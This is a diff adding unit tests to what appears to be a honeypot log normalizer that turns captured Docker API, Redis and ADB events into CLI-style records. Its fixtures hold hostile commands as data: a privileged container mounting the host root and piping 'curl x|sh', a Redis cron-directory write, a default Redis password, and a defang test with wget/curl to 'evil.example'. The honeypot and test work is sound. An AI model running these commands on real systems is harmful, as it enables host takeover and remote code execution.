@@ -50,3 +50,31 @@ def test_defang():
     assert defang("wget http://1.2.3.4/x; curl https://evil.example/a") == \
         "wget hxxp://1[.]2[.]3[.]4/x; curl hxxps://evil.example/a"
     assert defang(None) is None
+
+
+def test_docker_api_calls_become_cli_commands():
+    base = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "dst_port": 2375,
+            "persona": "docker", "headers": {}}
+    create = normalize(base | {"method": "POST", "path": "/v1.41/containers/create", "body": json.dumps(
+        {"Image": "alpine", "Cmd": ["chroot", "/mnt", "sh", "-c", "curl x|sh"],
+         "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True}})}, "s1")
+    assert create.command == "docker run --privileged -v /:/mnt alpine chroot /mnt sh -c curl x|sh"
+    pull = normalize(base | {"method": "POST", "path": "/images/create?fromImage=kinsing%2Fx&tag=latest"}, "s1")
+    assert pull.command == "docker pull kinsing/x:latest"
+    exe = normalize(base | {"method": "POST", "path": "/containers/4f1c9b2e8d0a77/exec",
+                            "body": '{"Cmd":["sh","-c","id"]}'}, "s1")
+    assert exe.command == "docker exec 4f1c9b2e8d0a sh -c id"
+    assert normalize(base | {"method": "GET", "path": "/version"}, "s1").command is None
+
+
+def test_tcp_service_records():
+    base = {"honeypot": "http", "ts": "2026-10-28T10:00:00Z", "src_ip": "203.0.113.9", "src_port": 40000,
+            "dst_port": 6379, "service": "redis", "session": "ab12"}
+    cmd = normalize(base | {"event": "command", "command": "config set dir /var/spool/cron"}, "s1")
+    assert (cmd.honeypot, cmd.proto, cmd.event_type, cmd.session_id) == ("redis", "redis", "command", "ab12")
+    auth = normalize(base | {"event": "login", "username": "default", "password": "foobared"}, "s1")
+    assert (auth.event_type, auth.password, auth.login_success) == ("login_attempt", "foobared", False)
+    dl = normalize(base | {"service": "adb", "dst_port": 5555, "event": "download", "sha256": "ab" * 32,
+                           "path": "/data/local/tmp/x", "size": 1024}, "s1")
+    assert (dl.event_type, dl.payload_hash, dl.extra["size"]) == ("download", "ab" * 32, 1024)
+    assert normalize(base | {"event": "bogus"}, "s1") is None
